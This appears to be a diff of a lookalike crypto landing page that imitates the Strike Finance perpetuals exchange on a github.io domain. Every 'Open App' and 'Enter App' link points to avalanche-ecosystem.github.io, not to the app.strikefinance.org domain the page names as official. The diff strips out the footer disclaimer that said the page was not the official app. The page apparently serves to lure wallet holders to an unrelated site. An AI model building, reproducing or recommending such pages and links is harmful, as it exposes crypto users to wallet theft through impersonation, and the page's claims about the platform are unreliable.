@@ -1,47 +1,120 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Strike Finance - Open App</title><meta name="description" content="strike finance opens the official perpetuals app for wallet trading, deposits, withdrawals, margin controls, and docs.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://strike-finance-page.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Strike Finance - Open App"><meta property="og:description" content="strike finance opens the official perpetuals app for wallet trading, deposits, withdrawals, margin controls, and docs.">
-<meta property="og:url" content="https://strike-finance-page.github.io/"><meta property="og:image" content="https://strike-finance-page.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Strike Finance - Open App"><meta name="twitter:description" content="strike finance opens the official perpetuals app for wallet trading, deposits, withdrawals, margin controls, and docs."><meta name="twitter:image" content="https://strike-finance-page.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://strike-finance-page.github.io/#website", "url": "https://strike-finance-page.github.io/", "name": "Strike Finance"}, {"@type": "WebPage", "@id": "https://strike-finance-page.github.io/#webpage", "url": "https://strike-finance-page.github.io/", "name": "Strike Finance - Open App", "description": "strike finance opens the official perpetuals app for wallet trading, deposits, withdrawals, margin controls, and docs.", "inLanguage": "en", "isPartOf": {"@id": "https://strike-finance-page.github.io/#website"}}, {"@type": "Organization", "@id": "https://strike-finance-page.github.io/#org", "name": "Strike Finance", "url": "https://strike-finance-page.github.io/", "logo": "https://strike-finance-page.github.io/og-cover.png", "sameAs": ["https://x.com/strikecardano", "https://github.com/strike-finance", "https://defillama.com/protocol/strike-finance"]}, {"@type": "WebApplication", "@id": "https://strike-finance-page.github.io/#app", "name": "Strike Finance", "url": "https://strike-finance-page.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "strike finance opens the official perpetuals app for wallet trading, deposits, withdrawals, margin controls, and docs.", "featureList": ["Official app: app.strikefinance.org", "Cardano and Ethereum settlement", "API documentation available"], "isPartOf": {"@id": "https://strike-finance-page.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://strike-finance-page.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Strike Finance used for?", "acceptedAnswer": {"@type": "Answer", "text": "Strike Finance is used for on-chain perpetuals trading. The docs describe a dedicated execution layer, cross-chain settlement, margin modes, advanced order types, and API access. It is not a spot swap page; it is a derivatives venue where leverage, funding, collateral, and liquidation rules drive risk."}}, {"@type": "Question", "name": "Which chains does Strike Finance support?", "acceptedAnswer": {"@type": "Answer", "text": "The Strike Finance materials describe Cardano and Ethereum settlement support, with assets held through on-chain locker contracts. Route and asset availability can change in the live app, so traders should use the official interface and docs before sending collateral from any chain."}}, {"@type": "Question", "name": "Does Strike Finance use an order book?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. Strike Finance docs describe Strike V2 as moving to a central limit order book architecture backed by a dedicated execution layer. That is different from older shared-liquidity AMM-style perpetual designs, where a pool often takes the opposite side of trades."}}, {"@type": "Question", "name": "How do Strike Finance withdrawals work?", "acceptedAnswer": {"@type": "Answer", "text": "Withdrawals are described as the reverse of the deposit flow. A user authorizes withdrawal with a wallet signature, margin checks are applied, and validators co-sign the release of assets from on-chain locker contracts. Open positions and margin requirements can affect withdrawable collateral."}}, {"@type": "Question", "name": "Is Strike Finance the same as Strike the payments app?", "acceptedAnswer": {"@type": "Answer", "text": "No. Strike Finance is a crypto derivatives and perpetuals platform at strikefinance.org. It should not be confused with other companies or apps using the word Strike. Always verify the domain, documentation, social links, and wallet prompts before interacting."}}, {"@type": "Question", "name": "Can I use the Strike Finance API for bots?", "acceptedAnswer": {"@type": "Answer", "text": "Strike Finance publishes API documentation, making it relevant for trading bots, dashboards, and market-data tools. API users still face the same position risk as manual traders: leverage, funding, liquidation, connectivity failures, and account-state errors can all create losses."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Strike Finance"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Strike Finance</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Strike Finance</title>
+  <meta name="description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
+  <link rel="canonical" href="https://strike-finance-page.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Strike Finance">
+  <meta property="og:description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
+  <meta property="og:url" content="https://strike-finance-page.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Strike Finance">
+  <meta name="twitter:description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://strike-finance-page.github.io/#website",
+        "url": "https://strike-finance-page.github.io/",
+        "name": "Strike Finance",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://strike-finance-page.github.io/#app",
+        "name": "Strike Finance",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://strike-finance-page.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://strike-finance-page.github.io/#organization",
+        "name": "Strike Finance",
+        "url": "https://www.strikefinance.org/",
+        "logo": "https://strike-finance-page.github.io/favicon.png"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Strike Finance home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Strike Finance</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://www.strikefinance.org/" target="_blank" rel="nofollow noopener noreferrer">Strike</a>
+      <a href="https://cardanoscan.io/" target="_blank" rel="nofollow noopener noreferrer">Cardanoscan</a>
+      <a href="https://ethereum.org/en/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Strike Finance">
       <h1>Strike Finance</h1>
-      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>Strike Finance</b><span class="badge">Perps</span></div><div class="appcard-chips"><span><b>Category</b> On-chain perpetuals</span><span><b>Network</b> Cardano and Ethereum settlement</span><span><b>Token</b> STRIKE</span><span><b>Launched</b> V1: May 2025</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Strike App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Strike Finance ↗</a></div>
-      <p class="hero-note">Live preview — open the official Strike Finance app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official app: app.strikefinance.org</span><span class="trust-chip">Cardano and Ethereum settlement</span><span class="trust-chip">API documentation available</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Strike Finance?</h2><div class="capsule"><strong>Strike Finance</strong> is an <a class="inline-link" href="https://www.binance.com/en/research/derivatives/on-chain-perpetuals" rel="noopener noreferrer">on-chain perpetuals trading platform</a> with a dedicated execution layer and <a class="inline-link" href="https://ethereum.org/en/developers/docs/bridges/" rel="noopener noreferrer">cross-chain settlement</a>, according to its <a href="https://docs.strikefinance.org/">official docs</a>. The app is built for wallet-based trading, deposits, withdrawals, margin modes, order types, and API access.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Strike Finance at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>On-chain perpetuals</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/cardano" rel="noopener noreferrer">Cardano</a> and Ethereum settlement</b></div><div class="f"><small>Token</small><b>STRIKE</b></div><div class="f"><small>Launched</small><b>V1: May 2025</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://docs.strikefinance.org/perpetuals/strike-node" rel="noopener noreferrer">On-chain locker contracts</a></b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Strike Finance perpetuals trading app</h2><div class="intent-a">Strike Finance is an on-chain perpetuals exchange with a dedicated execution layer and cross-chain settlement. The current V2 design described in the docs uses a <a class="inline-link" href="https://www.investopedia.com/terms/c/central_limit_order_book.asp" rel="noopener noreferrer">central limit order book model</a>, while custody and settlement remain anchored to on-chain locker contracts. Traders search for Strike Finance when they want wallet-based perpetuals, margin controls, advanced order types, and API access rather than a simple spot swap. The app flow generally involves connecting a wallet, depositing collateral, choosing a market, selecting <a class="inline-link" href="https://docs.strikefinance.org/perpetuals/margin-modes" rel="noopener noreferrer">cross or isolated margin</a> where available, and managing liquidation risk. <a class="inline-link" href="https://www.investopedia.com/terms/p/perpetual-futures.asp" rel="noopener noreferrer">Perpetuals are leveraged derivatives</a>, so price movement, funding, margin requirements, and liquidation rules matter more than token-swap slippage.</div></div></section><section class="section"><div class="container"><h2>Strike Finance deposits and withdrawals</h2><div class="intent-a">Strike Finance deposits and withdrawals are central to the product because trading balances are credited through validator-verified settlement rather than a normal centralized account deposit. The docs describe a quote, validate, and settle lifecycle: validators sign deposit quotes, users send assets to locker contracts, confirmations are verified, and the balance is credited on the execution layer. Withdrawals reverse the flow with wallet authorization and margin checks before assets are released. Users should check the supported chain, collateral asset, destination wallet, and any app-displayed confirmation requirements. Depositing volatile assets can involve conversion into stablecoin-denominated balances, so the wallet prompt and app quote need careful review.</div></div></section><section class="section section-alt"><div class="container"><h2>Strike Finance fees, <a class="inline-link" href="https://www.binance.com/en/support/faq/what-are-funding-rates-and-how-do-they-work-on-binance-futures-360033525671" rel="noopener noreferrer">funding rates</a> and margin</h2><div class="intent-a">Strike Finance search intent often includes fees, funding rates, and liquidation settings. The official docs separate topics such as funding rates, margin modes, margin tiers, and liquidations, which means users should not rely on a single static fee sentence. Perpetuals costs can include opening and closing fees, funding payments, spread, liquidation penalties, network costs, and any vault or collateral mechanics shown in the app. Funding can be positive or negative depending on market imbalance, so it can either add cost or credit over time. Before opening a position, traders should check position size, leverage, entry price, maintenance margin, liquidation price, funding rate, and whether they are using cross or isolated margin.</div></div></section><section class="section"><div class="container"><h2>Strike Finance API and trading bots</h2><div class="intent-a">Strike Finance provides API documentation for builders who want programmatic access to trading, market data, user data, and platform stats. That makes the product relevant for bot builders, dashboards, portfolio tools, and market makers, not only manual web-app users. API users still need to understand the exchange's execution model: the Strike Node processes trading messages while settlement remains connected to chain contracts. The key practical questions are authentication, market endpoints, order placement, rate limits, account state, and withdrawal safety. Anyone automating strategies should test carefully, monitor liquidation and funding exposure, and avoid assuming that API execution removes the underlying leveraged-derivative risk.</div></div></section><section class="section section-alt"><div class="container"><h2>Strike Finance token STRIKE and staking</h2><div class="intent-a">Strike Finance also has tokenomics and staking demand around the <a class="inline-link" href="https://www.coingecko.com/en/coins/strike" rel="noopener noreferrer">STRIKE token</a>, but that is separate from opening a perpetuals trade. Users searching for STRIKE token information usually want to know whether the token is connected to protocol revenue, staking, liquidity, or governance. Strong source pages for this are the official tokenomics and staking docs, plus third-party trackers such as <a class="inline-link" href="https://defillama.com/protocols/derivatives" rel="noopener noreferrer">DeFiLlama</a> for protocol-level metrics. The important landing-page distinction is that a trading position on Strike Finance is not the same thing as buying or staking STRIKE. Traders should separate market speculation on the token from collateral management, funding rates, and liquidation risk inside the perps app.</div></div></section>
-  <section class="section"><div class="container"><h2>How to trade Strike Finance</h2><ol class="steps"><li><b>Open the app</b><span>Use the official app domain, then choose the live market or tool you need.</span></li><li><b>Connect a wallet</b><span>Connect a supported crypto wallet and review any wallet prompts before signing.</span></li><li><b>Deposit collateral</b><span>Use the in-app deposit flow; validators quote, verify, and settle supported deposits on-chain.</span></li><li><b>Manage positions</b><span>Place orders, monitor margin, and use reduce-only, stop-loss, or take-profit controls where available.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official Strike Finance app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Strike Finance ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Strike Finance vs other perpetuals platforms</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Strike Finance</th><th>Alternative perps venue</th></tr></thead><tbody><tr><td>Execution</td><td>Dedicated Strike Node with <a class="inline-link" href="https://www.messari.io/report/the-evolution-of-on-chain-derivatives" rel="noopener noreferrer">CLOB</a>-style V2 design</td><td>May use AMM, CLOB, RFQ, or centralized matching</td></tr><tr><td>Settlement</td><td>On-chain locker contracts and validator verification</td><td>Varies by protocol or centralized exchange custody</td></tr><tr><td>Markets</td><td>Crypto perpetuals with margin controls</td><td>Market list and leverage vary by venue</td></tr><tr><td>Builder access</td><td>Official API documented for trading and market data</td><td>Some venues provide SDKs, APIs, or no public API</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Strike Finance FAQ</h2><div class="faq-list"><details open><summary><h3>What is Strike Finance used for?</h3></summary><div>Strike Finance is used for on-chain perpetuals trading. The docs describe a dedicated execution layer, cross-chain settlement, margin modes, advanced order types, and API access. It is not a spot swap page; it is a derivatives venue where leverage, funding, collateral, and liquidation rules drive risk.</div></details><details><summary><h3>Which chains does Strike Finance support?</h3></summary><div>The Strike Finance materials describe Cardano and Ethereum settlement support, with assets held through on-chain locker contracts. Route and asset availability can change in the live app, so traders should use the official interface and docs before sending collateral from any chain.</div></details><details><summary><h3>Does Strike Finance use an order book?</h3></summary><div>Yes. Strike Finance docs describe Strike V2 as moving to a central limit order book architecture backed by a dedicated execution layer. That is different from older shared-liquidity AMM-style perpetual designs, where a pool often takes the opposite side of trades.</div></details><details><summary><h3>How do Strike Finance withdrawals work?</h3></summary><div>Withdrawals are described as the reverse of the deposit flow. A user authorizes withdrawal with a wallet signature, margin checks are applied, and validators co-sign the release of assets from on-chain locker contracts. Open positions and margin requirements can affect withdrawable collateral.</div></details><details><summary><h3>Is Strike Finance the same as Strike the payments app?</h3></summary><div>No. Strike Finance is a crypto derivatives and perpetuals platform at strikefinance.org. It should not be confused with other companies or apps using the word Strike. Always verify the domain, documentation, social links, and wallet prompts before interacting.</div></details><details><summary><h3>Can I use the Strike Finance API for bots?</h3></summary><div>Strike Finance publishes API documentation, making it relevant for trading bots, dashboards, and market-data tools. API users still face the same position risk as manual traders: leverage, funding, liquidation, connectivity failures, and account-state errors can all create losses.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify app.strikefinance.org before connecting a wallet. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+      <p class="value"><strong>Strike Finance</strong> is a DeFi interface for wallet-based deposits and on-chain derivatives trading.</p>
+    </section>
+
+    <section class="app-card" aria-label="Trade setup">
+      <div class="route">
+        <div class="leg">
+          <span class="label">Deposit</span>
+          <span class="chip">
+            <img src="btc.png" width="28" height="28" alt="BTC collateral">
+            <span>BTC collateral</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch trade direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">Trade</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH market">
+            <span>ETH-PERP</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">Strike Finance &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
